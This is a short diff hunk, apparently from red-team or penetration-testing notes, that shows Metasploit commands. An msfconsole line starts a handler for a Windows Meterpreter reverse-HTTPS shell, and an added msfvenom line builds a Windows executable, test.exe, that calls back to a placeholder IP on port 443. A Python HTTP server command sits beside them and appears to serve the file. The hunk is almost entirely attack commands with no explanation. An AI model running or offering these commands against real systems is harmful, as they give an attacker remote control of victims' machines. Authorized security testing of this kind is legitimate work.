@@ -56,8 +56,7 @@ sudo python3 -m http.server 80
 ```
 sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set EXITFUNC thread; set LHOST <IP>; set LPORT 443; exploit -j"
 
-
-
+sudo msfvenom -p windows/meterpreter_reverse_https LHOST=<IP> LPORT=443 EXITFUNC=thread -f exe > test.exe
 ```
 
 
